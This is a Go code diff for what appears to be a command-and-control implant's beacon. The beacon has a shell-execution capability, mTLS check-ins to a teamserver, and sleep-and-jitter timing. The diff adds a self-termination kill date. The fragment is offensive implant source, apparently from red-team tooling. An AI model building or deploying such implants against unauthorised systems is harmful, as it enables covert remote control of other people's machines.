@@ -30,8 +30,9 @@ var Caps = []string{"shell.exec"}
 
 // Beacon runs the implant's check-in lifecycle against the teamserver: dial the
 // mTLS endpoint, complete the handshake, then loop dispatching downstream tasks
-// and reporting upstream results. It blocks until ctx is cancelled or the stream
-// ends. The cadence follows the baked-in sleep + jitter profile.
+// and reporting upstream results. It blocks until ctx is cancelled, the stream
+// ends, or the baked-in kill date passes. The cadence follows the baked-in
+// sleep + jitter profile.
 type Beacon struct {
 	beaconURL string
 	leaf      tls.Certificate
@@ -39,12 +40,16 @@ type Beacon struct {
 	implantID string
 	sleep     time.Duration
 	jitter    time.Duration
+	killDate  time.Time
 	runner    *exec.Runner
 	log       *log.Logger
 }
 
-// New builds a Beacon from an enrollment result and the beacon profile.
-func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certificate, sleep, jitter time.Duration, log *log.Logger) *Beacon {
+// New builds a Beacon from an enrollment result and the beacon profile. killDate
+// is the hard self-termination timestamp baked into the profile
+// (architecture.md Sec 7); the zero value disables the mid-run check (the
+// implant still refuses to start past it, enforced in main).
+func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certificate, sleep, jitter time.Duration, killDate time.Time, log *log.Logger) *Beacon {
 	return &Beacon{
 		beaconURL: beaconURL,
 		leaf:      leaf,
@@ -52,16 +57,23 @@ func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certific
 		implantID: implantID,
 		sleep:     sleep,
 		jitter:    jitter,
+		killDate:  killDate,
 		runner:    exec.NewRunner(log),
 		log:       log,
 	}
 }
 
-// Run blocks until the stream ends or ctx is cancelled. It reconnects after a
-// jittered sleep when the stream drops (implants are connection initiators;
-// flapping is expected and handled by reconnecting, architecture.md Sec 8).
+// Run blocks until the stream ends, ctx is cancelled, or the kill date passes.
+// It reconnects after a jittered sleep when the stream drops (implants are
+// connection initiators; flapping is expected and handled by reconnecting,
+// architecture.md Sec 8). The kill date is checked at the top of each cycle so a
+// long-running implant self-terminates once it passes, not only on the next
+// restart (architecture.md Sec 7).
 func (b *Beacon) Run(ctx context.Context) error {
 	for {
+		if !b.killDate.IsZero() && time.Now().After(b.killDate) {
+			return fmt.Errorf("kill date %s reached; terminating", b.killDate.Format(time.RFC3339))
+		}
 		if err := b.runOnce(ctx); err != nil {
 			b.log.Printf("beacon stream ended: %v", err)
 		}
